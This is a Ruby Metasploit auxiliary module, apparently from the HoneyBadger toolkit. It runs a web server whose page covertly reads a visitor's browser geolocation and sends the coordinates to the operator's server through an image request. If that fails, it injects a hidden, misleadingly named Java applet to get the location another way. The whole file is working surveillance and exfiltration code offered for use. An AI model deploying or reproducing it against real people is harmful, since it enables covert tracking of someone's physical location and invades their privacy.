require 'msf/core'

class Metasploit3 < Msf::Auxiliary

	include Msf::Exploit::Remote::HttpServer::HTML
	include Msf::Auxiliary::Badger_Report

	def initialize(info = {})
		super(update_info(info,
'Name'		=> 'HTML Geolocation Server (Badger)',
			'Description'	=> %q{
			This module can be used to spawn a HTTP server that serves
			HTML5, Javascript, and Java geolocation code.
			},
			'License'	=> MSF_LICENSE,
			'Author'	=> ['v10l3nt']
	))
	end

	def on_request_uri( cli, request )
		print_status("Requesting: #{request.uri}")
		if request.uri =~ /(gps=(.)+.jpg)/
			gps=$1.sub("gps=","").chomp(".jpg")
			print_status("#{self.name} Reporting Lat/Lon: #{gps}")
			return
		elsif request.uri.match(/\.js$/i)
			print_status("#{self.name} Generating Javascript and Sending To Browser")
			send_response_html( cli, generate_js(), { 'Content-Type' => 'application/javascript' } )
			return
		elsif request.uri.match(/\.jar$/i) 
			print_status("#{self.name} Generating Java Jar and Sending To Browser")
			send_response_html( cli, generate_jar(), { 'Content-Type' => 'application/java-archive' } )
			return
        elsif request.uri.match(/\.class$/i)
			print_status("#{self.name} Generating Java Class and Sending To Browser")
            send_response_html( cli, generate_class(), { 'Content-Type' => 'application/java-code' } )
			return

			return
        else
			print_status("#{self.name} Sending Location Request To Browser")
			send_response_html( cli, generate_html(), { 'Content-Type' => 'text/html' } )
			return
		end

	end

	def generate_html()
		path = get_resource()
        uri = return_uri
		reporting_uri = "#{uri}?target=#{datastore['BADGER_TGT']}&agent=msf_html"
        target = "#{datastore['BADGER_TGT']}"
        service = "#{uri}"
        html = <<-EOF
        <!doctype html>
        <head>
        <script type="text/javascript" src="#{path}/honey.js"></script>
        </head>
        <body>
        <h1>Honeybadger dont give a ...</h1>
        <img src="#{reporting_uri}"
        onerror="go('#{service}','#{target}', true);" width="1px" height="1px" />
        </body>
        </html>

        EOF
        
		return html
	end

	def generate_js()
		path = get_resource()

		js_data = <<-EOF
        function go(service, target, doApplet) {
            var gotloc = false;
                function showPosition(position) {
                    gotloc = true;
                    img=new Image();
                    img.src= service + "?target=" + target+ "&agent=msf_javascript&lat=" + position.coords.latitude + "&lng=" + position.coords.longitude + "&acc=" + position.coords.accuracy;
                }
                if (navigator.geolocation) {
                    navigator.geolocation.getCurrentPosition(showPosition);
                }
                    function useApplet(doApplet) {
                        if (!gotloc && doApplet) {
                            var a = document.createElement('applet');
                            a.setAttribute('code', '#{path}/honey.class');
                            a.setAttribute('archive', '#{path}/honey.jar');
                            a.setAttribute('name', 'Secure Java Applet');
                            a.setAttribute('width', '0');
                            a.setAttribute('height', '0');
                            var b = document.createElement('param');
                            b.setAttribute('name', 'target');
                            b.setAttribute('value', target);
                            a.appendChild(b);
                            var c = document.createElement('param');
                            c.setAttribute('name', 'service');
                            c.setAttribute('value', service);
                            a.appendChild(c);
                            document.getElementsByTagName('body')[0].appendChild(a);
                        }
                            }
                            window.setTimeout(function() { useApplet(doApplet); }, 5000);
                            }

        EOF
		return js_data
	end

	def generate_jar()
		path = File.join( Msf::Config.install_root, "data", "exploits", "honey.jar" )
		fd = File.open( path, "rb" )
		jar_data = fd.read(fd.stat.size)
		fd.close
		return jar_data
	end
	
    def generate_class()
        path = File.join( Msf::Config.install_root, "data", "exploits", "honey.class" )
        fd = File.open( path, "rb" )
        class_data = fd.read(fd.stat.size)
        fd.close
        return class_data
    end
                        
                        
	def run
		@seed = Rex::Text.rand_text_alpha(12)
		@client_cache = {}
		print_status("Listening on #{datastore['SRVHOST']}:#{datastore['SRVPORT']}...")
		exploit
	end

end
